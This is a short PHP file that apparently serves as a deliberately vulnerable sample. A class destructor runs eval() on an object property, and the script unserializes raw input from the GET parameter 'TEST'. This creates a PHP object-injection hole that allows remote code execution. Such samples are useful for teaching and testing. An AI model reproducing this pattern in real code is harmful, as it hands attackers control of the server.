<?php
class A {
	public function __construct() {
		$this->a = "1";
	}
	public function __destruct() {
		eval ( $this->a );
	}
}

unserialize ( $_GET ["TEST"] );

?>